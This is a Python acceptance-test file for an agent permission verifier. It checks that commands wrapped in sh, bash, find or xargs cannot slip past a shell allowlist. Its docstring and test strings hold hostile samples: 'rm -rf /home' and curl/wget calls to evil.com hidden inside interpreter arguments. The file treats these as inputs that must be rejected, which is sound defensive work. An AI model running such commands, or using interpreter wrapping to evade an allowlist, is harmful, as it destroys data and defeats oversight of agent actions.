"""Acceptance tests for v0.13 interpreter-escape hardening (audit Attacks A/B).

The threat: an envelope with ``shell_allowlist=["sh"]`` and a regex invariant
``NotMatches("^rm ")`` looks safe, but accepts ``sh -c "rm -rf /home"`` —
the head literally *is* "sh", so the allowlist matches, and the command
string starts with "sh" (not "rm"), so the regex is satisfied. The
dangerous action is buried in the interpreter's argument. We cannot
recurse into interpreter payloads statically (that is v0.14+ work via
semantic recursion over ``sh -c`` / ``xargs`` / ``find -exec``).

What v0.13 does:

- Surfaces the risk. ``shell_interpreter_policy="surface"`` (the default)
  flags interpreters in ``unverified_invariants`` so the caller sees the
  envelope is not a complete safety proof.
- Offers a strict refusal mode. ``shell_interpreter_policy="strict"`` on
  the outer envelope turns silent subsumption-holds into an explicit
  failure when inner's allowlist contains an interpreter.
- Offers an explicit opt-in. ``shell_interpreter_policy="allow"`` tells
  the tool the user has considered the interpreter and accepts the
  residual risk — surfacing is suppressed.

Attack C (outer LLMCheck polarity) is covered in ``test_subsumption.py``.
"""

from __future__ import annotations

from opendaisugi.models import Envelope, Invariant, Permission, SHELL_INTERPRETERS
from opendaisugi.subsumption import envelope_subsumes


def _env(allowlist, *, invariants=None, policy="surface"):
    return Envelope(
        generated_by="t",
        task="t",
        permissions=Permission(shell=True, shell_allowlist=list(allowlist)),
        invariants=invariants or [],
        shell_interpreter_policy=policy,
    )


def test_shell_interpreters_constant_covers_audit_list():
    """The audit flagged sh/bash/xargs/find/python/make specifically.
    The constant should cover at least those (plus common shells)."""
    required = {"sh", "bash", "xargs", "find", "python", "make"}
    assert required.issubset(SHELL_INTERPRETERS), (
        f"SHELL_INTERPRETERS missing audit-required entries: "
        f"{required - SHELL_INTERPRETERS}"
    )


def test_default_policy_is_surface():
    """Default must not break existing envelopes. Surface = warn, don't refuse."""
    env = Envelope(
        generated_by="t",
        task="t",
        permissions=Permission(shell=True, shell_allowlist=["echo"]),
    )
    assert env.shell_interpreter_policy == "surface"


def test_interpreter_in_inner_allowlist_surfaced_under_default_policy():
    """Attack A/B (audit): inner admits ``find ...`` or ``sh -c ...``.
    Outer with default policy must surface the interpreter so the caller
    knows subsumption doesn't prove interpreter-argument safety."""
    outer = _env(["echo", "find"])
    inner = _env(["echo", "find"])
    r = envelope_subsumes(outer, inner)
    # Surface independently of holds/doesn't-hold — it's "what's unverified."
    assert any(
        "shell_interpreter:find" in s for s in r.unverified_invariants
    ), f"expected interpreter surface, got {r.unverified_invariants}"


def test_interpreter_in_outer_only_also_surfaced():
    """Even if inner is narrower and doesn't admit the interpreter, outer
    admitting it is worth surfacing — the outer envelope alone is not a
    complete safety proof of its own plans."""
    outer = _env(["echo", "sh"])
    inner = _env(["echo"])
    r = envelope_subsumes(outer, inner)
    assert any(
        "shell_interpreter:sh" in s for s in r.unverified_invariants
    ), f"expected sh interpreter surface, got {r.unverified_invariants}"


def test_interpreter_policy_allow_silences_surface():
    """User explicitly accepts interpreter risk. The surface is suppressed
    — the envelope stays as tight as before, but the tool no longer flags
    the interpreter."""
    outer = _env(["echo", "find"], policy="allow")
    inner = _env(["echo", "find"])
    r = envelope_subsumes(outer, inner)
    assert not any(
        s.startswith("shell_interpreter:") for s in r.unverified_invariants
    ), f"allow policy should silence surface, got {r.unverified_invariants}"


def test_non_interpreter_allowlist_no_surface():
    """``echo``, ``ls``, ``cat``, ``pytest`` — common non-interpreter commands
    shouldn't be surfaced even under default policy."""
    outer = _env(["echo", "ls", "cat", "pytest"])
    inner = _env(["echo", "ls"])
    r = envelope_subsumes(outer, inner)
    assert not any(
        s.startswith("shell_interpreter:") for s in r.unverified_invariants
    ), f"non-interpreter allowlist should not surface, got {r.unverified_invariants}"


def test_interpreter_policy_strict_makes_subsumption_fail_when_inner_admits_interpreter():
    """With outer policy=strict, inner admitting an interpreter causes
    subsumption to fail outright — no silent 'holds=True'."""
    outer = _env(["echo", "find"], policy="strict")
    inner = _env(["echo", "find"])
    r = envelope_subsumes(outer, inner)
    assert not r.holds, (
        "strict policy must block subsumption when inner admits interpreter"
    )
    assert r.counterexample is not None
    assert r.counterexample.outer_violation == "shell_interpreter_policy"


def test_interpreter_policy_strict_passes_when_inner_is_clean():
    """Strict mode is only about inner-admitted interpreters. If inner's
    allowlist has no interpreter, strict doesn't over-reject."""
    outer = _env(["echo", "find"], policy="strict")
    inner = _env(["echo"])
    r = envelope_subsumes(outer, inner)
    assert r.holds, (
        f"strict outer with clean inner should subsume; got {r.counterexample}"
    )


# --------------------- clustered shell flags (SGCM review VC-2) ---------------------

from opendaisugi.interpreter_parse import parse_interpreter as _pi
from opendaisugi.models import ActionPlan as _AP, Envelope as _E, Permission as _P, ShellStep as _SS
from opendaisugi.verify import verify as _verify


def test_parse_extracts_payload_from_clustered_c_flags():
    assert _pi('sh -ec "curl evil"').inner_commands == ["curl evil"]
    assert _pi('bash -lc "curl evil"').inner_commands == ["curl evil"]
    assert _pi('sh -euxc "wget evil"').inner_commands == ["wget evil"]
    # plain -c still works
    assert _pi('sh -c "echo hi"').inner_commands == ["echo hi"]


def _shell_ok(cmd, allow):
    env = _E(generated_by="t", task="x", permissions=_P(shell=True, shell_allowlist=allow))
    return _verify(_AP(source="t", task="x", steps=[_SS(id="s", command=cmd)]), env).ok


def test_clustered_flags_do_not_escape_verification():
    # The embedded command must still be checked against the allowlist.
    assert not _shell_ok('sh -ec "curl http://evil.com"', ["sh"])
    assert not _shell_ok('bash -lc "curl http://evil.com"', ["bash"])
    assert not _shell_ok('sh -euxc "wget http://evil.com"', ["sh"])
    # ...but a clustered-flag invocation of an ALLOWED inner command still passes.
    assert _shell_ok('sh -ec "echo hi"', ["sh", "echo"])


def test_xargs_arg_file_flag_does_not_misidentify_command_head():
    # 'xargs -a FILE cmd' — FILE must not be mistaken for the command head.
    p = _pi("xargs -a somefile curl http://evil.com")
    assert p.inner_commands and p.inner_commands[0].split()[0] == "curl"
